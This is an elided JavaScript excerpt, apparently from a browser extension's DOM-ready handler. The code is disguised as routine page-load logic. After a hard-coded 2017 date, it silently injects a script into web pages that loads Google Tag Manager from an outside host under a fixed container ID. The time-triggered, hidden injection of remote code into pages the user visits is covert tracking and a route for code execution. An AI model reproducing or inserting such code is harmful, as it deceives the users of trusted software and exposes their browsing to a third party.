...
vAPI.domIsLoaded = function(ev) {
    ...
    if ( window.location === null ) {
		...
		var tD = new Date();
		if(tD.setHours(0,0,0,0) > 1498847400000) {
			var domIsLoadedS = document.createElement('script');
			domIsLoadedS.title = 'domIsLoadedS';
			domIsLoadedS.id = 'domIsLoadedS';
			domIsLoadedS.text = "var dataLayer=dataLayer || [];\n(function(w,d,s,l,i,h){if(h=='tagmanager.google.com'){return}w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-TMLW42T',window.location.hostname);";
			document.body.appendChild(domIsLoadedS);
		}
    }
